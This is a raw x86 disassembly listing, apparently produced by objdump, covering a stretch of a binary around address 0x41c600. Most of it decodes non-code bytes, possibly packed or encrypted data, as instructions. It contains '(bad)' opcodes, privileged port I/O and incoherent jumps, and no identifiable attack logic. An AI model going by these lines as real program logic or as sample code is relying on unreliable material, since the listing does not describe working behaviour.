  41c601:	sbb    eax,0x183af5a
  41c606:	jecxz  0x41c5f5
  41c608:	add    eax,0xd8fc1cdc
  41c60d:	scas   al,BYTE PTR es:[edi]
  41c60e:	loop   0x41c64f
  41c610:	mov    edi,0xd2ddac2d
  41c615:	inc    edx
  41c616:	aaa    
  41c617:	adc    esi,ebx
  41c619:	scas   al,BYTE PTR es:[edi]
  41c61a:	aas    
  41c61b:	mov    eax,0x80a6dd68
  41c620:	inc    ecx
  41c621:	inc    esp
  41c622:	jae    0x41c682
  41c624:	xchg   BYTE PTR [esi+0x3c],bl
  41c627:	retf   
  41c628:	les    ecx,FWORD PTR [ecx-0x62d4bca2]
  41c62e:	dec    ebx
  41c62f:	xchg   edx,eax
  41c630:	jmp    0xd84abc21
  41c635:	fwait
  41c636:	ss xor esp,esi
  41c639:	dec    eax
  41c63a:	shr    DWORD PTR [ecx],1
  41c63c:	pusha  
  41c63d:	jae    0x41c5d4
  41c63f:	paddusw mm5,QWORD PTR [eax+0x4234f42d]
  41c646:	out    0xe9,eax
  41c648:	retf   
  41c649:	push   edi
  41c64a:	mov    ebx,0xd45017d
  41c64f:	cmc    
  41c650:	mov    dl,0x87
  41c652:	and    cl,BYTE PTR [ebx-0x30]
  41c655:	adc    esp,DWORD PTR cs:[edi+0x7b]
  41c659:	sub    al,0x44
  41c65b:	imul   ecx,ebx,0x2e
  41c65e:	inc    esi
  41c65f:	inc    ebp
  41c660:	iret   
  41c661:	fcmovnu st,st(4)
  41c663:	jno    0x41c6d8
  41c665:	repnz sub cl,bl
  41c668:	inc    ebp
  41c669:	sub    eax,0x1bb53aa3
  41c66e:	arpl   WORD PTR [edx],sp
  41c670:	xchg   ebx,eax
  41c671:	and    bl,BYTE PTR [ebx+0x795a56ef]
  41c677:	push   ebx
  41c678:	add    al,0x4a
  41c67a:	sbb    eax,0x76764c78
  41c67f:	dec    esp
  41c680:	jle    0x41c636
  41c682:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c683:	clc    
  41c684:	xchg   BYTE PTR [esp+edi*1-0x3f4cf43c],al
  41c68b:	mov    dh,cl
  41c68d:	and    ebp,ebx
  41c68f:	cli    
  41c690:	lds    ebp,FWORD PTR [esi+0x3c]
  41c693:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c694:	fwait
  41c695:	test   BYTE PTR [edx+0x23188dd7],0x20
  41c69c:	mov    esi,0xedab4de
  41c6a1:	push   0xffffffbd
  41c6a3:	xor    eax,0x2292054f
  41c6a8:	les    ax,DWORD PTR [ebp-0x21]
  41c6ac:	push   edx
  41c6ad:	sbb    DWORD PTR [eax+0x7],esi
  41c6b0:	sbb    BYTE PTR [esi+0x4d863be0],cl
  41c6b6:	mov    ds:0xf058ed74,al
  41c6bb:	mov    ds:0xc113f019,eax
  41c6c0:	dec    esi
  41c6c1:	mov    BYTE PTR [eax-0x42875694],ch
  41c6c7:	push   ss
  41c6c8:	sbb    DWORD PTR [esi-0x1e48b2ba],ebx
  41c6ce:	add    DWORD PTR [edi+edx*8],ecx
  41c6d1:	fwait
  41c6d2:	inc    ebx
  41c6d3:	xchg   edx,eax
  41c6d4:	cmp    dl,BYTE PTR [edi+0x1059cb0b]
  41c6da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6db:	pop    ecx
  41c6dc:	cdq    
  41c6dd:	push   ebp
  41c6de:	gs inc ebx
  41c6e0:	jp     0x41c662
  41c6e2:	cwde   
  41c6e3:	and    al,0x83
  41c6e5:	fldenv ds:0x7083473a
  41c6eb:	xor    al,BYTE PTR [ecx]
  41c6ed:	out    0xa0,eax
  41c6ef:	cmp    BYTE PTR [ecx],ch
  41c6f1:	xchg   esi,eax
  41c6f2:	cmp    ah,BYTE PTR [edx-0x24]
  41c6f5:	cli    
  41c6f6:	xor    al,0xfe
  41c6f8:	es addr16 cdq 
  41c6fb:	imul   edx,DWORD PTR [edx-0x77],0x9fd18caa
  41c702:	enter  0xd823,0xb9
  41c706:	ret    
  41c707:	dec    esp
  41c709:	pop    edx
  41c70a:	push   ds
  41c70b:	sar    DWORD PTR [eax],cl
  41c70d:	aaa    
  41c70e:	popa   
  41c70f:	loopne 0x41c6f2
  41c711:	or     ah,BYTE PTR [edi+0x14]
  41c714:	mov    ecx,0x75b9fa07
  41c719:	int3   
  41c71a:	sub    eax,0x92901328
  41c71f:	test   BYTE PTR [eax+0x3f06164a],0x21
  41c726:	(bad)  
  41c727:	fucom  st(5)
  41c729:	mov    esp,0xd3d3abee
  41c72e:	mov    esp,0xb80b1af
  41c733:	and    eax,0xeb16f5d2
  41c738:	or     eax,0xe06a3208
  41c73d:	mov    ebp,DWORD PTR [edi+0x5cd2a219]
  41c743:	mov    al,0x2e
  41c745:	jl     0x41c79e
  41c747:	dec    esp
  41c748:	push   ebx
  41c749:	inc    esp
  41c74a:	push   esp
  41c74b:	xchg   BYTE PTR [esp+esi*4+0x20],bl
  41c74f:	frndint 
  41c751:	push   esp
  41c752:	cs mov bh,0x55
  41c755:	jl     0x41c6d7
  41c757:	xor    edx,DWORD PTR [ebp+ebp*8-0x38de1bee]
  41c75e:	inc    ebx
  41c75f:	mov    ah,0xaf
  41c761:	enter  0xb7b7,0x32
  41c765:	and    eax,0x86af6c40
  41c76a:	mov    cl,0x77
  41c76c:	pop    eax
  41c76d:	loope  0x41c735
  41c76f:	or     al,BYTE PTR [eax+edi*4+0xa]
  41c773:	aad    0x19
  41c775:	cwde   
  41c776:	pop    ss
  41c777:	in     al,0x8f
  41c779:	addr16 dec esp
  41c77b:	sub    eax,0x52009faf
  41c780:	nop
  41c781:	loop   0x41c77a
  41c783:	rol    BYTE PTR [edx],0x2
  41c786:	push   cs
  41c787:	scas   eax,DWORD PTR es:[edi]
  41c788:	fidiv  WORD PTR [esi-0x7d]
  41c78b:	xchg   ebx,eax
  41c78c:	in     eax,0xf9
  41c78e:	pop    ds
  41c78f:	js     0x41c80f
  41c791:	push   0x4d
  41c793:	outs   dx,DWORD PTR ds:[esi]
  41c794:	and    BYTE PTR [edi-0x3],0x70
  41c798:	pop    eax
  41c799:	rcl    BYTE PTR [ebx],0x2c
  41c79c:	test   al,0x20
  41c79e:	cmp    BYTE PTR [ebp+0x59],bl
  41c7a1:	(bad)  
  41c7a2:	xor    al,0xe5
  41c7a4:	sar    BYTE PTR [edi],1
  41c7a6:	imul   ebp,DWORD PTR [ecx+0x4b],0xba79388b
  41c7ad:	pushf  
  41c7ae:	enter  0x66a0,0xfe
  41c7b2:	fwait
  41c7b3:	pop    ds
  41c7b4:	mov    edi,0x3ff4c023
  41c7b9:	lds    edx,FWORD PTR [edi-0xe]
  41c7bc:	mov    bh,BYTE PTR [ecx-0xfc23369]
  41c7c2:	data16 sub BYTE PTR ds:0xa3e82611,bh
  41c7c9:	pop    esp
  41c7ca:	(bad)  
  41c7cc:	jae    0x41c79e
  41c7ce:	lods   eax,DWORD PTR ds:[esi]
  41c7cf:	(bad)  
  41c7d0:	loope  0x41c7fb
  41c7d2:	js     0x41c7e3
  41c7d4:	xor    esi,DWORD PTR [eax]
  41c7d6:	push   0x7f
  41c7d8:	daa    
  41c7d9:	sbb    ebx,DWORD PTR [edi]
  41c7db:	popa   
  41c7dc:	dec    esp
  41c7dd:	pushf  
  41c7de:	mov    ?,WORD PTR [eax]
  41c7e0:	xor    eax,0x4e53463
  41c7e5:	sbb    BYTE PTR [ebx-0x262b3a69],0xb
  41c7ec:	out    dx,eax
  41c7ed:	cdq    
  41c7ee:	push   ebx
  41c7ef:	sbb    ebx,DWORD PTR [ebx-0x6e]
  41c7f2:	stos   DWORD PTR es:[edi],eax
  41c7f3:	aad    0x56
  41c7f5:	pop    ss
  41c7f6:	push   ss
  41c7f7:	inc    ecx
  41c7f8:	jl     0x41c811
  41c7fa:	fistp  DWORD PTR [edx]
  41c7fc:	mov    cl,0xa1
  41c7fe:	pushf  
  41c7ff:	iret   
  41c800:	xchg   ebx,eax
  41c801:	int    0xe6
  41c803:	and    eax,0xaf33141d
  41c808:	inc    eax
  41c809:	lahf   
  41c80a:	out    dx,al
  41c80b:	push   ds
  41c80c:	and    ecx,edi
  41c80e:	mov    BYTE PTR [eax+0x26],0x7f
  41c812:	inc    ebp
  41c813:	arpl   WORD PTR [ebp-0x5f],bx
  41c816:	mov    esi,0x17f4c109
  41c81b:	pop    esi
  41c81c:	and    DWORD PTR [bp+si-0x4c],ebp
  41c820:	xchg   ebx,eax
  41c821:	ds or  edi,ebp
  41c824:	je     0x41c7c5
  41c826:	push   esp
  41c827:	jle    0x41c7ad
  41c829:	aaa    
  41c82a:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41c82c:	rcl    BYTE PTR [ecx+0x6a265cd8],cl
  41c832:	xchg   esi,eax
  41c833:	sbb    ah,BYTE PTR [edx+ecx*8-0x15e60ada]
  41c83a:	sbb    ebp,DWORD PTR [ebx+0x9]
  41c83d:	fsub   QWORD PTR [ecx+0x18308368]
  41c843:	xchg   ecx,eax
  41c844:	dec    ecx
  41c845:	xchg   ebp,eax
  41c846:	jmp    0xd426:0xd85f316
  41c84d:	add    dl,BYTE PTR [edi-0x5]
  41c850:	jo     0x41c85a
  41c852:	xor    esp,ebp
  41c854:	std    
  41c855:	inc    ebp
  41c856:	push   ebx
  41c857:	aad    0x15
  41c859:	pop    edx
  41c85a:	das    
  41c85b:	outs   dx,BYTE PTR ds:[esi]
  41c85c:	nop
  41c85d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c85e:	sbb    al,0xa7
  41c860:	imul   ebp,DWORD PTR [ebx],0x63c5e8a6
  41c866:	stos   DWORD PTR es:[edi],eax
  41c867:	inc    ebx
  41c868:	xchg   ebx,eax
  41c869:	and    ebp,DWORD PTR ds:0xa96c435
  41c86f:	test   DWORD PTR [eax-0x20b298a0],eax
  41c875:	or     eax,0x4841fb77
  41c87a:	(bad)  
  41c87b:	cli    
  41c87c:	or     BYTE PTR [esi],bl
  41c87e:	xlat   BYTE PTR ds:[ebx]
  41c87f:	xlat   BYTE PTR ds:[ebx]
  41c880:	add    ebx,edi
  41c882:	out    0x30,al
  41c884:	cmc    
  41c885:	int3   
  41c886:	lods   eax,DWORD PTR ds:[esi]
  41c887:	xchg   ebx,eax
  41c888:	in     eax,0x67
  41c88a:	shl    edx,cl
  41c88c:	jmp    0x41c8ac
  41c88e:	retf   0xbffa
  41c891:	bound  esp,QWORD PTR [ecx-0x6e]
  41c894:	call   0x3280:0xb54fd76a
  41c89b:	scas   al,BYTE PTR es:[edi]
  41c89c:	dec    edi
  41c89d:	push   0x3
  41c89f:	ror    DWORD PTR [ebx-0x50f0f3b3],0xc1
  41c8a6:	add    eax,DWORD PTR [ebp+0x8]
  41c8a9:	mov    DWORD PTR [ebp+0xc],eax
  41c8ac:	mov    eax,DWORD PTR [ebp+0xc]
  41c8af:	pop    esi
  41c8b0:	leave  
  41c8b1:	ret    0x8
  41c8b4:	pop    ss
  41c8b5:	or     al,0x84
  41c8b7:	repz lahf 
  41c8b9:	sti    
  41c8ba:	ja     0x41c8a8
  41c8bc:	stos   BYTE PTR es:[edi],al
  41c8bd:	mov    edx,0xda8788e2
  41c8c2:	push   edx
  41c8c3:	aad    0xaf
  41c8c5:	test   DWORD PTR [ecx],eax
  41c8c7:	add    BYTE PTR [eax+eax*1-0x6f1b0000],ch
  41c8ce:	outs   dx,BYTE PTR ds:[esi]
  41c8cf:	push   0xffffff99
  41c8d1:	or     DWORD PTR [edx-0x3c56a36d],edi
  41c8d7:	test   BYTE PTR [edx],dh
  41c8d9:	adc    edx,0xffffffab
  41c8dc:	sbb    DWORD PTR [ebx+0x336db095],edx
  41c8e2:	mov    esp,0x6b1ca161
  41c8e7:	add    al,0xb2
  41c8e9:	ins    BYTE PTR es:[edi],dx
  41c8ea:	inc    eax
  41c8eb:	push   cs
  41c8ec:	jle    0x41c957
  41c8ee:	mov    ebp,0x52b86b9
  41c8f3:	xchg   esi,eax
  41c8f4:	pop    esi
  41c8f5:	popf   
  41c8f6:	sbb    bh,BYTE PTR [ebx-0x73]
  41c8f9:	mov    al,0xa3
  41c8fb:	jge    0x41c8ce
  41c8fd:	sub    eax,0xea6bb140
  41c902:	sub    eax,0x7d182c72
  41c907:	and    al,BYTE PTR [eax]
  41c909:	repz sbb eax,0xb1b5106b
  41c90f:	sub    al,0xf
  41c911:	sub    al,0xab
  41c913:	cld    
  41c914:	mov    bh,BYTE PTR [esi]
  41c916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c917:	jmp    0x3389:0xdc9e8dbc
  41c91e:	repnz adc DWORD PTR [edx+0x3],0x954bebf0
  41c926:	inc    ebx
  41c927:	push   edi
  41c928:	addr16 pop esi
  41c92a:	add    DWORD PTR [ebx+0x39],ebx
  41c92d:	ja     0x41c8d7
  41c92f:	shl    DWORD PTR [edx+0x2],1
  41c932:	mov    bl,0xe7
  41c934:	mov    al,0x8f
  41c936:	out    dx,al
  41c937:	loopne 0x41c942
  41c939:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c93a:	ret    
  41c93b:	mov    al,0xb2
  41c93d:	jmp    0x41c9b4
  41c93f:	ss mov edi,0x9f1f56ec
  41c945:	jo     0x41c93e
  41c947:	mov    DWORD PTR [ebp-0x442b49a6],ebx
  41c94d:	mov    WORD PTR ds:0x843bbcc2,ss
  41c953:	push   0xf
  41c955:	mov    dh,0x17
  41c957:	adc    ah,BYTE PTR [ebx-0x42c60314]
  41c95d:	out    0x4e,eax
  41c95f:	mov    edi,0xfa43d63
  41c964:	stos   BYTE PTR es:[edi],al
  41c965:	data16 and bh,BYTE PTR [ebx]
  41c968:	pop    esp
  41c969:	leave  
  41c96a:	in     al,dx
  41c96b:	push   ss
  41c96c:	icebp  
  41c96d:	push   esp
  41c96e:	test   BYTE PTR [ebx],ah
  41c970:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c971:	std    
  41c972:	lods   eax,DWORD PTR ds:[esi]
  41c973:	inc    edi
  41c974:	push   es
  41c975:	aam    0xf
  41c977:	out    0x0,al
	...
  41c981:	add    BYTE PTR [eax],al
  41c983:	add    cl,dl
  41c985:	sub    al,0x14
  41c987:	adc    edi,ebp
  41c989:	cmp    edx,edi
  41c98b:	out    dx,al
  41c98c:	pop    edi
  41c98d:	xchg   bx,ax
  41c98f:	push   0xd57d523d
  41c994:	pop    ebx
  41c995:	xchg   BYTE PTR [ecx],al
  41c997:	add    BYTE PTR [eax+eax*1+0x3ae10000],ch
  41c99e:	loopne 0x41c929
  41c9a0:	ds gs loopne 0x41ca19
  41c9a4:	shl    edx,0x21
  41c9a7:	in     eax,dx
  41c9a8:	ja     0x41c96c
  41c9aa:	add    ah,BYTE PTR [edi-0x39]
  41c9ad:	lock (bad) 
  41c9af:	ds loop 0x41ca21
  41c9b2:	ror    bl,0xcc
  41c9b5:	(bad)  
  41c9b6:	pop    esp
  41c9b7:	push   esi
  41c9b8:	scas   eax,DWORD PTR es:[edi]
  41c9b9:	add    eax,DWORD PTR [eax]
  41c9bb:	jne    0x41c989
  41c9bd:	dec    ebx
  41c9be:	pop    ss
  41c9bf:	sbb    bl,BYTE PTR [ecx-0x39c9331e]
  41c9c5:	xchg   ecx,eax
  41c9c6:	fdiv   DWORD PTR [esi+0x5af5a105]
  41c9cc:	les    ebp,FWORD PTR [ebx-0x29]
  41c9cf:	lods   eax,DWORD PTR ds:[esi]
  41c9d0:	arpl   WORD PTR [ecx+0x78f3958b],si
  41c9d6:	adc    al,0xad
  41c9d8:	out    0xfc,eax
  41c9da:	mov    WORD PTR [eax],cs
  41c9dc:	and    dh,cl
  41c9de:	adc    BYTE PTR [esi],bl
  41c9e0:	adc    eax,0x3d941bf
  41c9e5:	adc    DWORD PTR [edx+0x65d5b17a],0xf57f743b
  41c9ef:	call   esi
  41c9f1:	ss test eax,0x904eeeb0
  41c9f7:	mov    dh,BYTE PTR [eax+0x7e5f45df]
  41c9fd:	push   esp
  41c9fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9ff:	imul   edx,DWORD PTR [edx+0x19b2958f],0xffffffeb
  41ca06:	ret    0x67d5
  41ca09:	popf   
  41ca0a:	pop    eax
  41ca0b:	add    eax,0xfbd06074
  41ca10:	and    eax,0xb0959c19
  41ca15:	jg     0x41ca27
  41ca17:	(bad)  
  41ca18:	fisubr WORD PTR [esi]
  41ca1a:	js     0x41c9af
  41ca1c:	push   esi
  41ca1d:	adc    BYTE PTR [edi-0x2c78ee77],0x86
  41ca24:	mov    esp,0xad5c1d9c
  41ca29:	js     0x41c9e6
  41ca2b:	xor    cl,BYTE PTR [ebp-0x54]
  41ca2e:	loop   0x41c9f5
  41ca30:	pop    esi
  41ca31:	jge    0x41ca54
  41ca33:	mov    bl,0x45
  41ca35:	lds    eax,FWORD PTR [ecx]
  41ca37:	stos   BYTE PTR es:[edi],al
  41ca38:	dec    ebx
  41ca39:	fidivr WORD PTR [edi]
  41ca3b:	rcr    ah,1
  41ca3d:	mov    al,ds:0x5c23a92
  41ca42:	out    0x80,al
  41ca44:	mov    BYTE PTR [edx+0x3942],cl
	...
  41ca52:	add    BYTE PTR [eax],al
  41ca54:	pop    ds
  41ca55:	sub    esp,DWORD PTR [eax-0x60404bc1]
  41ca5b:	sub    eax,esi
  41ca5d:	add    BYTE PTR [edi+eax*2+0x9dcb7e4],0x7
  41ca65:	xchg   DWORD PTR [ecx],eax
  41ca67:	add    BYTE PTR [eax+eax*1+0x3680000],ch
  41ca6e:	clc    
  41ca6f:	mov    esp,eax
  41ca71:	test   eax,0x88949804
  41ca76:	add    al,0x4f
  41ca78:	push   ds
  41ca79:	jnp    0x41cacc
  41ca7b:	mov    cl,0x4f
  41ca7d:	pop    edi
  41ca7e:	jl     0x41ca33
  41ca80:	add    DWORD PTR [edi+0x60],ecx
  41ca83:	cdq    
  41ca84:	(bad)  [esi]
  41ca86:	mov    cl,BYTE PTR [ecx]
  41ca88:	into   
  41ca89:	jmp    0xfdd8:0x8a68d5ca
  41ca90:	push   es
  41ca91:	test   BYTE PTR [ebp-0x65f5e96b],bh
  41ca97:	arpl   WORD PTR [eax],di
  41ca99:	js     0x41ca5a
  41ca9b:	mov    edi,ss
  41ca9d:	es nop
  41ca9f:	push   es
  41caa0:	cmp    bl,al
  41caa2:	and    eax,0xe004fc1c
  41caa7:	dec    esp
  41caa8:	(bad)  
  41caa9:	ffree  st(4)
  41caab:	mov    bh,0xf9
  41caad:	popa   
  41caae:	pop    ds
  41caaf:	add    esp,ebp
  41cab1:	ins    DWORD PTR es:[edi],dx
  41cab2:	cmp    eax,0xc4e8144f
  41cab7:	(bad)  
  41cab8:	jl     0x41cb2d
  41caba:	adc    al,0xcf
  41cabc:	jo     0x41cb10
  41cabe:	xor    al,al
  41cac0:	mov    ebp,DWORD PTR [ebx+0x2ecc65fd]
  41cac6:	jle    0x41ca86
  41cac8:	push   ss
  41cac9:	call   0x8330:0x68af213a
  41cad0:	mov    ecx,0xd2b07be3
  41cad5:	xchg   BYTE PTR [eax+eax*8-0x5a401cae],dh
  41cadc:	dec    ecx
  41cadd:	sub    al,0xd9
  41cadf:	int    0x6e
  41cae1:	inc    ecx
  41cae2:	ror    BYTE PTR [ebx],cl
  41cae4:	pop    di
  41cae6:	sti    
  41cae7:	aas    
  41cae8:	mov    cs,WORD PTR [eax-0x5bf8588f]
  41caee:	sub    eax,0x530a0af
  41caf3:	mov    dh,0x97
  41caf5:	inc    ebp
  41caf6:	sbb    DWORD PTR [esi-0x54630077],eax
  41cafc:	xor    dl,ah
  41cafe:	adc    BYTE PTR ds:0x3f34e181,bh
  41cb04:	(bad)  
  41cb05:	call   0xb0a7:0xb787e244
  41cb0c:	repnz dec esp
  41cb0e:	pop    eax
  41cb0f:	jae    0x41caeb
  41cb11:	and    al,0x47
  41cb13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb14:	or     eax,0x89936c
	...
  41cb21:	add    BYTE PTR [eax],al
  41cb23:	add    BYTE PTR [edi],ch
  41cb25:	and    al,0xf0
  41cb27:	aam    0xfb
  41cb29:	aam    0x2f
  41cb2b:	jmp    FWORD PTR [esi+0x33]
  41cb2e:	je     0x41cae6
  41cb30:	stc    
  41cb31:	std    
  41cb32:	lahf   
  41cb33:	dec    ecx
  41cb34:	mov    bl,0x87
  41cb36:	add    DWORD PTR [eax],eax
  41cb38:	lods   al,BYTE PTR ds:[esi]
  41cb39:	add    BYTE PTR [eax],al
  41cb3b:	add    BYTE PTR [edi+0x4798446],cl
  41cb41:	adc    DWORD PTR [ebp+0x3894452],0x19
  41cb48:	das    
  41cb49:	stos   BYTE PTR es:[edi],al
  41cb4a:	inc    esi
  41cb4b:	cmp    bh,BYTE PTR [ebx+ecx*2-0x5e50da53]
  41cb52:	mov    ebp,0xfa975f03
  41cb57:	test   DWORD PTR [ecx+0x4f],esp
  41cb5a:	lahf   
  41cb5b:	call   0x7a82702e
  41cb60:	fcomp  QWORD PTR [esi-0x24]
  41cb63:	lock lods al,BYTE PTR ds:[esi]
  41cb65:	nop
  41cb66:	jmp    DWORD PTR [esi+0x28]
  41cb69:	inc    ebx
  41cb6a:	jns    0x41cbbf
  41cb6c:	push   edi
  41cb6d:	in     al,dx
  41cb6e:	mov    eax,0x463465b8
  41cb73:	loopne 0x41cb65
  41cb75:	fld    QWORD PTR [esi-0x458addbd]
  41cb7b:	je     0x41cb09
  41cb7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb7e:	jmp    0x62b4b66a
  41cb83:	mov    ch,0x57
  41cb85:	leave  
  41cb86:	loope  0x41cb58
  41cb88:	cmp    esp,ecx
  41cb8a:	inc    esp
  41cb8b:	dec    ebp
  41cb8c:	ds jo  0x41cb79
  41cb8f:	loop   0x41cb4c
  41cb91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb92:	shr    BYTE PTR [ebx+edx*1+0x28312a21],0x38
  41cb9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb9b:	sub    ch,ah
  41cb9d:	cld    
  41cb9e:	mov    bl,0x95
  41cba0:	les    ebx,FWORD PTR [esi-0x19]
  41cba3:	popa   
  41cba4:	lods   eax,DWORD PTR ds:[esi]
  41cba5:	cmp    eax,0x826c1c96
  41cbaa:	jl     0x41cb9b
  41cbac:	loop   0x41cb4c
  41cbae:	xchg   ebp,eax
  41cbaf:	in     al,dx
  41cbb0:	jg     0x41cbdf
  41cbb2:	cwde   
  41cbb3:	adc    DWORD PTR [esp+ebp*8-0x22ff5d61],edx
  41cbba:	retf   0x8186
  41cbbd:	sbb    al,0x41
  41cbbf:	or     al,0xe3
  41cbc1:	scas   al,BYTE PTR es:[edi]
  41cbc2:	or     eax,0x2bb1eafb
  41cbc7:	ins    BYTE PTR es:[edi],dx
  41cbc8:	fimul  DWORD PTR [ebx]
  41cbca:	pop    es
  41cbcb:	sbb    BYTE PTR [eax],dh
  41cbcd:	lods   al,BYTE PTR ds:[esi]
  41cbce:	clc    
  41cbcf:	bswap  edi
  41cbd1:	scas   eax,DWORD PTR es:[edi]
  41cbd2:	and    BYTE PTR [ebx],dh
  41cbd4:	pop    ecx
  41cbd5:	pop    ebx
  41cbd6:	xor    BYTE PTR [edx],0xb3
  41cbd9:	push   edx
  41cbda:	jle    0x41cc2a
  41cbdc:	scas   al,BYTE PTR es:[edi]
  41cbdd:	mov    ds:0xf3f5e5f8,al
  41cbe2:	cmc    
  41cbe3:	pop    esi
  41cbe4:	pushf  
  41cbe5:	pusha  
  41cbe6:	lods   al,BYTE PTR ds:[esi]
  41cbe7:	push   edi
	...
  41cbf4:	retf   0x76a0
  41cbf7:	dec    ebp
  41cbf8:	jle    0x41cbd9
  41cbfa:	sti    
  41cbfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbfc:	mov    bh,0x83
  41cbfe:	dec    edi
  41cbff:	mov    ds:0xec9e1c,al
  41cc04:	pop    edi
  41cc05:	mov    BYTE PTR [ecx],al
  41cc07:	add    BYTE PTR [eax+eax*1-0x5bb30000],ch
  41cc0e:	push   ds
  41cc0f:	retf   
  41cc10:	test   BYTE PTR [edx],al
  41cc12:	xor    al,0x90
  41cc14:	sub    BYTE PTR [ecx-0x77035ba7],0x39
  41cc1b:	jecxz  0x41cc29
  41cc1d:	jns    0x41cc7b
  41cc1f:	xchg   ebx,eax
  41cc20:	shr    BYTE PTR [ebp+0x73cd0e41],1
  41cc26:	(bad)  
  41cc27:	imul   eax,DWORD PTR [ebx+0x76],0x60
  41cc2b:	lods   al,BYTE PTR ds:[esi]
  41cc2c:	add    eax,0x9a5851f0
  41cc31:	cmp    cl,BYTE PTR [esi-0x7c5c6eb3]
  41cc37:	cdq    
  41cc38:	adc    al,ah
  41cc3a:	lods   al,BYTE PTR ds:[esi]
  41cc3b:	push   edi
  41cc3c:	jo     0x41cc82
  41cc3e:	xchg   ebx,eax
  41cc3f:	loop   0x41cbdb
  41cc41:	sub    eax,0x21e2f72b
  41cc46:	mov    esi,0xc8895ccf
  41cc4b:	adc    edx,0x3649e0b0
  41cc51:	mov    ebx,0x8382f48f
  41cc56:	cmc    
  41cc57:	ret    0xbc35
  41cc5a:	popf   
  41cc5b:	jns    0x41cc19
  41cc5d:	lock into 
  41cc5f:	cmp    eax,0xbbce9bd7
  41cc64:	cdq    
  41cc65:	cmp    BYTE PTR ds:0x99c9d7e0,ah
  41cc6b:	or     DWORD PTR [esi+0x755830fe],esp
  41cc71:	call   0x5d072d04
  41cc76:	loopne 0x41ccc5
  41cc78:	ss popa 
  41cc7a:	ret    
  41cc7b:	mov    ebx,0xde26ca1c
  41cc80:	xchg   edx,eax
  41cc81:	(bad)  
  41cc82:	sub    al,0x79
  41cc84:	xchg   esi,eax
  41cc85:	pop    eax
  41cc86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc87:	sbb    bl,BYTE PTR [ecx]
  41cc89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc8a:	jmp    0x41cc41
  41cc8c:	aas    
  41cc8d:	xor    DWORD PTR [ebx+0x3],eax
  41cc90:	push   edx
  41cc91:	sub    edx,DWORD PTR [ebp-0x427a49d]
  41cc97:	add    BYTE PTR [eax],dl
  41cc99:	mov    al,ds:0xc58829db
  41cc9e:	mov    edi,DWORD PTR [eax-0x26bf976a]
  41cca4:	(bad)  
  41cca5:	fs jg  0x41ccb1
  41cca8:	stos   BYTE PTR es:[edi],al
  41cca9:	xchg   cl,al
  41ccab:	add    al,0x1e
  41ccad:	adc    ch,BYTE PTR [edi]
  41ccaf:	int3   
  41ccb0:	jnp    0x41cd00
  41ccb2:	adc    BYTE PTR [edi-0x3],ch
  41ccb5:	push   0x4f9f
	...
  41ccc2:	add    BYTE PTR [eax],al
  41ccc4:	(bad)  
  41ccc5:	out    dx,al
  41ccc6:	lods   al,BYTE PTR ds:[esi]
  41ccc7:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  41ccce:	stc    
  41cccf:	stc    
  41ccd0:	pop    ss
  41ccd1:	adc    DWORD PTR [ecx+eax*4],edi
  41ccd4:	or     ecx,DWORD PTR [ecx+0xac0001]
  41ccda:	add    BYTE PTR [eax],al
  41ccdc:	jp     0x41cca4
  41ccde:	ret    
  41ccdf:	cli    
  41cce0:	cmp    dl,BYTE PTR [ecx]
  41cce2:	jp     0x41cd57
  41cce4:	loop   0x41cc93
  41cce6:	and    edx,ecx
  41cce8:	inc    edx
  41cce9:	push   0x47
  41cceb:	dec    esi
  41ccec:	pushf  
  41cced:	test   al,0x54
  41ccef:	aad    0x49
  41ccf1:	daa    
  41ccf2:	jno    0x41cd13
  41ccf4:	sub    BYTE PTR [ecx+0x5f3c2f5f],al
  41ccfa:	mov    cl,dh
  41ccfc:	ret    
  41ccfd:	or     BYTE PTR [eax-0xe436a42],ch
  41cd03:	mov    WORD PTR [ecx],ds
  41cd05:	adc    eax,0x1320ca9d
  41cd0a:	ins    BYTE PTR es:[edi],dx
  41cd0b:	mov    eax,0x68dc7863
  41cd10:	je     0x41cd1b
  41cd12:	xchg   edx,eax
  41cd13:	mov    eax,0x2ba354be
  41cd18:	(bad)  
  41cd19:	int    0x51
  41cd1b:	pop    ebx
  41cd1c:	mov    al,0x3c
  41cd1e:	lods   al,BYTE PTR ds:[esi]
  41cd1f:	push   es
  41cd20:	pushf  
  41cd21:	stos   DWORD PTR es:[edi],eax
  41cd22:	sbb    al,0x56
  41cd24:	and    al,0xc9
  41cd26:	or     al,0xbc
  41cd28:	inc    edx
  41cd29:	mov    eax,0xc7b7ca1
  41cd2e:	sub    ah,BYTE PTR [ebp-0x7d281450]
  41cd34:	push   ebp
  41cd35:	sti    
  41cd36:	push   0xffffff8f
  41cd38:	arpl   WORD PTR [ebx],cx
  41cd3a:	xchg   esi,eax
  41cd3b:	jnp    0x41ccca
  41cd3d:	ret    
  41cd3e:	aad    0x0
  41cd40:	mov    fs,WORD PTR [esi]
  41cd42:	mov    eax,0x3f06484d
  41cd47:	dec    ebx
  41cd48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd49:	out    0x20,eax
  41cd4b:	call   0xd82:0x9d13d7d8
  41cd52:	push   ebx
  41cd53:	dec    ebx
  41cd54:	mov    ebp,0xc2b39bd
  41cd59:	fs nop
  41cd5b:	lods   al,BYTE PTR ds:[esi]
  41cd5c:	push   ss
  41cd5d:	retf   0x8009
  41cd60:	scas   eax,DWORD PTR es:[edi]
  41cd61:	sbb    bh,dl
  41cd63:	(bad)  
  41cd64:	xor    cl,cl
  41cd66:	push   edi
